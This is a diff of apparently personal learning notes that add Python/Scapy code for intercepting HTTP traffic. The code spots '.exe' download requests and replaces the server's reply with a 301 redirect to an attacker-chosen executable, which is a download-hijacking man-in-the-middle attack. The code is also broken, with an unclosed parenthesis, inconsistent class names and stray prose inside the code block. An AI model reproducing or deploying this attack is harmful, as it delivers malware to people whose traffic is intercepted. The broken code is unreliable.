@@ -358,7 +358,39 @@ if 'iie' in qname:
         #now need to modify the actual packet since we were playing around with scapy packet
         packet.set_payload(str(scapy_packet))
         
+
+now the modification will be done in http layer instead of dns. In scapy data in http are placed in raw layer.Distinguishing req & response by
+seeing whether http is in sport or dport. Netfilter and scapy are used as in the previous case except inside the function.
+ack_list = []
+if scapy_packet.haslayer(scapy.Raw
+        if scapy_packet[scapy.TCP].dport == 80:
+                if '.exe' in scapy_packet[scapy.Raw].load: #this is what is needed to be replaced
+                        #but not as easy as replacing the url to the file since tcp handshakes are required. There might be multiple requests
+                        happening at the backend for a single click. Need to confirm the response for the req ie the ack of the request will be same as 
+                        seq of the response.
+                        ack_list.append(scapy_packet[scapy.Tcp].ack)
+                        
+         if scapy_packet[scapy.TCP].sport == 80:
+                if scapy_packet[scapy.Tcp].seq in ack_list:
+                        ack_list.remove(scapy_packet[scapy.Tcp].seq)  # need to remove it from list since we already act on it
+                        print('replacing the file')
+                        #need to put the code for replacement in here
+                        # use 301 http response to indicate the site has moved permanently
+                        scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved permanently\nLocation: http://<exes url>\n\n'
+                        del scapy_packet[scapy.IP].len
+                        del scapy_packet[scapy.IP].chksum
+                        del scapy_packet[scapy.TCP].len
+                        packet.set_payload(str(scapy_packet))
+                        
+                        
+                        
+         
+                        
+                        
+                        
         
+
+
         
         
 
